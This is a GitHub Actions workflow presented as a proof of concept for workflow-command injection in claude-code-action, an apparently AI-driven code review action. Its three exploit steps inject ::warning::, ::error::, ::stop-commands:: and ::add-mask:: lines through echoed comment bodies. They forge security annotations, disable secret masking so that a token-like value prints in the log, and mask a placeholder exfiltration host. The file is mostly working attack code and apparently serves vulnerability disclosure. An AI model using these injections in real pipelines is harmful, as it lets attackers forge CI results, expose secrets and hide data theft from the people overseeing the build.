name: "PoC: GHA Workflow Command Injection in claude-code-action"

on:
  workflow_dispatch:

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:

      # ── CONTROL: normal masking works ──
      - name: "Control — add-mask hides a secret"
        run: |
          echo "::add-mask::SuperSecretToken_abc123"
          echo "Control output: SuperSecretToken_abc123"

      # ── EXPLOIT A: inject fake CI annotations ──
      - name: "Exploit A — inject ::warning:: and ::error:: annotations"
        run: |
          printf '{"path":"src/index.ts","line":10,"body":"Test probe\\n::warning::INJECTED-BY-ATTACKER: fake warning annotation"}\n{"path":"src/auth.ts","line":5,"body":"Check logic\\n::error file=src/auth.ts,line=5::SECURITY BUG: authentication bypass detected"}\n' > /tmp/buf.jsonl
          node -e '
          const fs = require("fs");
          const filtered = fs.readFileSync("/tmp/buf.jsonl","utf8").split("\n").filter(Boolean).map(l=>JSON.parse(l));
          if (filtered.length > 0) {
            console.log("::warning::"+filtered.length+" buffered comment(s) classified as test/probe — NOT posted:");
            for (const c of filtered) { console.log("  ["+c.path+":"+c.line+"] "+c.body.slice(0,120)); }
          }'

      # ── EXPLOIT B: stop-commands suppresses all subsequent workflow commands ──
      - name: "Exploit B — stop-commands disables masking (HIGH severity proof)"
        run: |
          printf '{"path":"src/a.ts","line":1,"body":"Probe\\n::stop-commands::attacker-token"}\n' > /tmp/buf2.jsonl
          node -e '
          const fs = require("fs");
          const filtered = fs.readFileSync("/tmp/buf2.jsonl","utf8").split("\n").filter(Boolean).map(l=>JSON.parse(l));
          if (filtered.length > 0) {
            console.log("::warning::"+filtered.length+" buffered comment(s) classified as test/probe — NOT posted:");
            for (const c of filtered) { console.log("  ["+c.path+":"+c.line+"] "+c.body.slice(0,120)); }
          }'

          echo "--- after stop-commands, add-mask is now broken ---"
          echo "::add-mask::ghs_R3alInSt4llT0k3nV4lu3Here99"
          echo "LEAKED TOKEN: ghs_R3alInSt4llT0k3nV4lu3Here99"
          echo "::warning::POST-STOP-CANARY: if this is an annotation, stop-commands failed"

      # ── EXPLOIT C: add-mask hides attacker evidence ──
      - name: "Exploit C — add-mask hides strings in logs"
        run: |
          printf '{"path":"src/c.ts","line":1,"body":"Check\\n::add-mask::exfil.attacker.com"}\n' > /tmp/buf3.jsonl
          node -e '
          const fs = require("fs");
          const filtered = fs.readFileSync("/tmp/buf3.jsonl","utf8").split("\n").filter(Boolean).map(l=>JSON.parse(l));
          if (filtered.length > 0) {
            console.log("::warning::"+filtered.length+" buffered comment(s) classified as test/probe — NOT posted:");
            for (const c of filtered) { console.log("  ["+c.path+":"+c.line+"] "+c.body.slice(0,120)); }
          }'
          echo "Exfiltration URL: exfil.attacker.com"

      # ── CONTROL: prove workflow commands work normally in clean step ──
      - name: "Control — normal annotations"
        run: |
          echo "::warning::CONTROL-WARNING: legitimate warning"
          echo "::error::CONTROL-ERROR: legitimate error"
